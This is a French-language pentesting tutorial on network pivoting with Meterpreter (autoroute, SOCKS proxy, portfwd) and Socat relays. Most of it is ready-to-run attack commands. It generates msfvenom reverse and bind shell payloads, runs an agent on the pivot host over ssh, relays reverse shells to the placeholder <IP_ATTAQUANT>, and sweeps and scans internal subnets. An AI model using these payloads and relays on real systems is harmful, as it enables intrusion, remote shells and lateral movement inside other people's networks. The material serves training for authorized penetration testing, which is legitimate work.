# Pivoting avec Meterpreter et Socat

Quand SSH n'est pas disponible ou quand on a deja une session Meterpreter, Metasploit offre ses propres mecanismes de pivoting : autoroute pour le routage, socks_proxy pour le proxy SOCKS, et portfwd pour la redirection de ports. Socat est un outil complementaire qui agit comme un relais bidirectionnel entre deux connexions reseau.

## Pourquoi

SSH n'est pas toujours disponible. Sur un pivot Windows, Meterpreter est souvent le seul moyen d'etablir un tunnel. Socat, de son cote, est un outil leger present sur beaucoup de systemes Linux qui permet de rediriger du trafic sans configuration complexe.

## Comment ca marche

### Meterpreter : autoroute et SOCKS proxy

#### Etablir le pivot

```bash
# 1 - Generer un payload pour le pivot host (Linux)
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=<IP_ATTAQUANT> LPORT=8080 -f elf -o agent

# 2 - Configurer le handler
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run

# 3 - Transferer et executer le payload sur le pivot
scp agent user@<IP_PIVOT>:~/
ssh user@<IP_PIVOT> "chmod +x agent && ./agent"
```

#### Ajouter les routes avec autoroute

```bash
# - Depuis la session Meterpreter
run autoroute -s 172.16.5.0/23

# - Verifier les routes actives
run autoroute -p
```

Ou via le module post-exploitation :

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

#### Configurer le proxy SOCKS

```bash
# - Demarrer le proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run
```

Ajouter dans `/etc/proxychains.conf` :

```
socks4 127.0.0.1 9050
```

A partir de la, `proxychains nmap -sT -Pn 172.16.5.19` fonctionne exactement comme avec un tunnel SSH.

### Meterpreter : portfwd

Le module `portfwd` permet de creer des redirections de ports directement depuis la session Meterpreter, sans passer par proxychains.

{% tabs %}
{% tab title="Forward (local)" %}
```bash
# - Rediriger le RDP d'un hote interne vers notre port local 3300
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# - Se connecter via le port local
xfreerdp /v:localhost:3300 /u:user /p:password
```
{% endtab %}
{% tab title="Reverse" %}
```bash
# - Le pivot ecoute sur 1234 et redirige vers notre port 8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L <IP_ATTAQUANT>

# - Configurer le handler sur le port 8081
set LPORT 8081
set LHOST 0.0.0.0
run
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
`portfwd` est plus simple que proxychains pour acceder a un service specifique (RDP, SMB, WinRM). Proxychains est preferable quand on veut scanner ou utiliser plusieurs outils differents.
{% endhint %}

### Ping sweep depuis Meterpreter

Avant de scanner un reseau interne, identifier les hotes actifs :

```bash
# - Ping sweep via Meterpreter
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

{% tabs %}
{% tab title="Linux" %}
```bash
# - Ping sweep en one-liner
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```
{% endtab %}
{% tab title="Windows CMD" %}
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
{% endtab %}
{% tab title="PowerShell" %}
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```
{% endtab %}
{% endtabs %}

### Socat : relais bidirectionnel

Socat cree un relais TCP simple entre deux endpoints. Il est utile comme redirecteur quand on ne veut pas (ou ne peut pas) utiliser SSH.

#### Reverse shell via Socat

```bash
# - Sur le pivot : rediriger le port 8080 vers notre listener sur le port 80
socat TCP4-LISTEN:8080,fork TCP4:<IP_ATTAQUANT>:80
```

Le payload de la cible interne pointe vers le pivot (`172.16.5.129:8080`). Socat redirige le trafic vers notre listener (`<IP_ATTAQUANT>:80`).

```bash
# - Generer le payload (LHOST = IP interne du pivot)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=172.16.5.129 LPORT=8080 -f exe -o shell.exe

# - Configurer notre listener
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

#### Bind shell via Socat

```bash
# - Sur le pivot : rediriger notre connexion vers le bind shell de la cible
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# - Generer un bind shell payload
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bind.exe LPORT=8443

# - Se connecter via Socat
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <IP_PIVOT>
set LPORT 8080
run
```

{% hint style="warning" %}
Socat ne chiffre pas le trafic. Si la discretion est importante, preferer un tunnel SSH ou Chisel. Socat est surtout utile pour des redirections rapides quand SSH n'est pas une option.
{% endhint %}

## En pratique

```bash
# Scenario Meterpreter
# 1 - Obtenir une session Meterpreter sur le pivot
# 2 - Ajouter les routes
run autoroute -s 172.16.5.0/23
# 3 - Demarrer le proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run
# 4 - Scanner via proxychains
proxychains nmap -sT -Pn 172.16.5.19 -p 22,445,3389

# Scenario Socat
# 1 - Sur le pivot : demarrer le relais
socat TCP4-LISTEN:8080,fork TCP4:<IP_ATTAQUANT>:80
# 2 - Generer le payload pointant vers le pivot
# 3 - Executer sur la cible interne
```

## Pieges et galeres

- **Session Meterpreter instable** : si la session tombe, les routes et le proxy tombent aussi. Utiliser `exploit/multi/handler` en mode `-j` (background job) pour pouvoir reagir rapidement
- **Autoroute et sous-reseaux** : autoroute ajoute les routes basees sur la table de routage du pivot. Verifier avec `run autoroute -p` que le sous-reseau cible est bien present
- **SOCKS version** : certains outils fonctionnent mieux avec SOCKS5. Si un outil ne passe pas en SOCKS4a, changer la version dans le module et dans proxychains.conf
- **Socat fork** : l'option `fork` est indispensable pour gerer plusieurs connexions. Sans elle, socat se ferme apres la premiere connexion

## Retour terrain

Meterpreter est incontournable pour le pivoting sur les cibles Windows ou quand SSH n'est pas disponible. La combinaison `autoroute` + `socks_proxy` + `proxychains` reproduit exactement le comportement d'un tunnel SSH dynamique, mais depuis une session Meterpreter.

Socat est un outil de secours apprecie. Il ne necessite pas d'acces SSH et s'installe (ou se compile) facilement sur n'importe quel Linux. En pratique, on l'utilise surtout comme redirecteur simple pour faire transiter un reverse shell a travers le pivot.

## Memo express

| Technique | Commande | Usage |
|---|---|---|
| Autoroute | `run autoroute -s 172.16.5.0/23` | Ajouter une route via Meterpreter |
| SOCKS proxy | `auxiliary/server/socks_proxy` | Proxy SOCKS depuis Meterpreter |
| Portfwd local | `portfwd add -l 3300 -p 3389 -r <cible>` | Rediriger un port distant |
| Portfwd reverse | `portfwd add -R -l 8081 -p 1234 -L <ip>` | Recevoir un reverse shell |
| Ping sweep | `post/multi/gather/ping_sweep` | Decouvrir les hotes internes |
| Socat relay | `socat TCP4-LISTEN:8080,fork TCP4:<ip>:80` | Relais TCP simple |

***
